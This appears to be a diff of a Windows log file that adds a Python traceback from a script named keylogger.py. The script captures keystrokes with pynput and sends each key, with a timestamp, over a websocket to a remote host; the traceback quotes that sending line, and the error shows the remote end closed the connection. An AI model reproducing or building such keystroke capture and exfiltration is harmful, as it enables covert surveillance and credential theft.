@@ -1,1 +1,21 @@
-2020-05-28 16:26:12,161: Using proactor: IocpProactor:
+2020-05-29 15:48:34,336: Unhandled exception in listener callback:
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\pynput\_util\__init__.py", line 162, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\pynput\keyboard\_win32.py", line 280, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "keylogger.py", line 30, in on_press
+    ws.send('{"timestamp": "' + str(datetime.now()) + '" , "keyPressed": "' + str(key) + '" }')
+  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_core.py", line 253, in send
+    return self.send_frame(frame)
+  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_core.py", line 279, in send_frame
+    l = self._send(data)
+  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_core.py", line 449, in _send
+    return send(self.sock, data)
+  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_socket.py", line 157, in send
+    return _send()
+  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_socket.py", line 139, in _send
+    return sock.send(data)
+ConnectionResetError: [WinError 10054] An existing connection was forcibly closed by the remote host
